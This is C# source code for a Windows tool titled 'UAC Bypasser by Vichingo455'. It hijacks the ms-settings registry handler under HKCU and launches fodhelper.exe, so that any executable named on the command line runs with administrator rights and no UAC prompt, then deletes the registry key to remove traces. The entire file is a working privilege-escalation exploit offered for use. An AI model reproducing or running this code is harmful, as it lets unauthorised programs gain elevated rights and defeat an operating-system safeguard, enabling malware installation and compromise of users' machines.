using System;
using System.Diagnostics;
using System.Reflection;
using System.Security.Principal;
using Microsoft.Win32;
using System.IO;
namespace Bypass_UAC
{
    internal static class Program
    {
        /// <summary>
        /// Punto di ingresso principale dell'applicazione.
        /// </summary>
        [STAThread]
        static void Main(string[] switches)
        {
            Console.Title = "UAC Bypasser by Vichingo455";
            if (Environment.OSVersion.Version.Build < 9200)
            {
                Console.WriteLine("This program requires NT 10.0 (Windows 10) or higher! Operation aborted");
                Console.ReadKey();
                Environment.Exit(-1);
            }
            else
            {
                if (switches.Length == 1)
                {
                    string arg = switches[0].Trim();
                    if (File.Exists(arg))
                    {
                        WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                        bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
                        if (!hasAdministrativeRight)
                        {
                            try
                            {
                                RegistryKey rk;
                                rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\ms-settings\shell\open\command");
                                rk.SetValue("", arg, RegistryValueKind.String);
                                rk.SetValue("DelegateExecute", "", RegistryValueKind.String);
                                Process.Start(@"C:\Windows\System32\fodhelper.exe").WaitForExit();
                                rk.Close();
                                rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                                rk.DeleteSubKeyTree("ms-settings");
                                rk.Close();
                                Environment.Exit(0);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("An exception occured: " + ex.Message);
                                Console.ReadKey();
                                Environment.Exit(-1);
                            }
                        }
                        }
                    else
                    {
                        Console.WriteLine($"The file {arg} specified in the argument is not valid! Operation Aborted!");
                        Console.ReadKey();
                        Environment.Exit(-1);
                    }
                }
                else
                {
                    Console.WriteLine(@"You need to specify the file path, for example C:\Windows\System32\cmd.exe. Operation Aborted!");
                    Console.ReadKey();
                    Environment.Exit(-1);
                }
            }
        }
    }
}
